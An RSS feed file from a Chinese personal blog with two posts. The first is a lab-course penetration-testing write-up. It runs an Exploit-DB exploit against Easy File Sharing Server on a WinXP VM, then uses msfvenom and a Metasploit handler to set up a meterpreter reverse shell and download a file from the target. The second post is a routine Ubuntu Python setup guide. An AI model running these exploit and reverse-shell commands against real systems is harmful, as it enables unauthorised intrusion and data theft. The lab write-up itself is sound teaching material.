@@ -1,0 +1,96 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title> • Posts by &#34;python&#34; tag</title>
+        <link>http://meviv.github.io</link>
+        <description>夜深忽夢少年事</description>
+        <language>zh-HK</language>
+        <pubDate>Sat, 05 Nov 2022 15:16:53 +0800</pubDate>
+        <lastBuildDate>Sat, 05 Nov 2022 15:16:53 +0800</lastBuildDate>
+        <category>Python</category>
+        <category>Ubuntu</category>
+        <category>诗</category>
+        <category>CTF</category>
+        <category>渗透</category>
+        <category>杂谈</category>
+        <category>Java</category>
+        <category>Web</category>
+        <item>
+            <guid isPermalink="true">http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/</guid>
+            <title>渗透复现任务A</title>
+            <link>http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/</link>
+            <category>Python</category>
+            <category>渗透</category>
+            <pubDate>Sat, 05 Nov 2022 15:16:53 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;实验课复现内容&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h1 id=&#34;漏洞渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞渗透测试&#34;&gt;#&lt;/a&gt; 漏洞渗透测试&lt;/h1&gt;
+&lt;p&gt;1、靶机 (Windows) 安装 easy file sharing server（efssetup_2018.zip)，该服务存在漏洞。&lt;br&gt;
+2、利用 Nmap 扫描发现靶机 (Windows) 运行了该服务。P99-100&lt;br&gt;
+3、利用该漏洞，使得靶机运行计算器。P116-119&lt;/p&gt;
+&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
+&lt;p&gt;靶机：WinXP&lt;br&gt;
+ 开启 easy file sharing 服务&lt;br&gt;
+攻击机：kali2022&lt;br&gt;
+ 两机位于同一网段内，需要相互 ping 通&lt;br&gt;
+ (如遇无法 ping 通的情况，可关闭 winXP 的防火墙)&lt;/p&gt;
+&lt;h2 id=&#34;渗透过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h2&gt;
+&lt;p&gt;打开 kail 攻击机，扫描同一子网下主机&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan -l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmu7z7poj30k505dwfp.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+对靶机进行进一步扫描，查看端口开放情况&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sV -A 192.168.232.132&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmub58p8j30ni0is43b.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+知道了靶机开放端口服务&lt;br&gt;
+使用 searchsploit&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit easy file sharing&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit -m 39009&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuf74hwj31bn0khjz7.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+运行脚本 python2+path+ip+port&lt;/p&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;由于脚本输出没有使用严格括号，需要声明 py2 运行&lt;/p&gt;
+&lt;/div&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python2 &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;exploitdb&amp;#x2F;exploits&amp;#x2F;windows&amp;#x2F;remote&amp;#x2F;39009.py 192.168.232.132 80&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmul45h6j30iw023dg1.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
+&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuohza7j309a09b3z6.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+至此完成渗透&lt;/p&gt;
+&lt;h1 id=&#34;metasploit应用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#metasploit应用&#34;&gt;#&lt;/a&gt; Metasploit 应用&lt;/h1&gt;
+&lt;p&gt;1、生成主控端、被控端。&lt;br&gt;
+2、获得靶机 (Windows) 控制权。&lt;br&gt;
+3、下载靶机上任意一个文件。P121-123;140-145&lt;/p&gt;
+&lt;h2 id=&#34;环境搭建-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境搭建-2&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
+&lt;p&gt;靶机：winXP (192.168.232.132)&lt;br&gt;
+ 攻击机：kali (192.168.232.130)&lt;br&gt;
+ 注意两机位于同一网段内&lt;/p&gt;
+&lt;h2 id=&#34;渗透过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程-2&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h2&gt;
+&lt;p&gt;生成被控端，在 kali 以 root 账户执行&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp lhost&amp;#x3D;192.168.232.130 lport&amp;#x3D;5000 -f exe -o &amp;#x2F;root&amp;#x2F;payload.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;生成 payload.exe 后传到靶机&lt;br&gt;
+&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmura9z5j30om03tdgt.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+生成主控端&lt;br&gt;
+再次以 root 账户执行&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit&amp;#x2F;multi&amp;#x2F;handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set payload windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lhost 192.168.232.130&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lport 5000&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmuyixy0j30oi0is43x.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+此时，将生成的 payload.exe 程序复制到靶机上运行&lt;br&gt;
+成功获取权限&lt;br&gt;
+执行 ls 查看需要的文件。输入 dowload log.txt 下载文件&lt;br&gt;
+&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7vmv0mr1rj30ha0ecwj3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+成功下载文件&lt;br&gt;
+&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmv28ro7j30i00e7jry.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://meviv.github.io/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/</guid>
+            <title>ubuntu系统配置python</title>
+            <link>http://meviv.github.io/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/</link>
+            <category>Python</category>
+            <category>Ubuntu</category>
+            <pubDate>Sat, 04 Jun 2022 13:41:40 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;为 ubuntu 服务器配置 py 环境用于运行代码.&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h1 id=&#34;环境配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境配置&#34;&gt;#&lt;/a&gt; 环境配置&lt;/h1&gt;
+&lt;p&gt;为 ubuntu 服务器配置 py 环境用于运行代码.&lt;br&gt;
+ 所用系统镜像为 Ubuntu20.04&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sudo apt install python3.10-dev&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sudo apt install python3.10-distutils&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sudo apt install python3.10-venv&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;note warning&#34;&gt;
+&lt;p&gt;注意&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;通过此种方法配置的 Python 会缺少 pip 包，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13ZWd0Z2V0LXBpcC15ejU1YXl6ZTc4OGE3eHoucHk=&#34;&gt;需要 wegt 装载 get-pip.py&lt;/span&gt;.&lt;br&gt;
+ 再次运行即可&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wget https:&amp;#x2F;&amp;#x2F;bootstrap.pypa.io&amp;#x2F;get-pip.py&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python3.10 get-pip.py&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+    </channel>
+</rss>
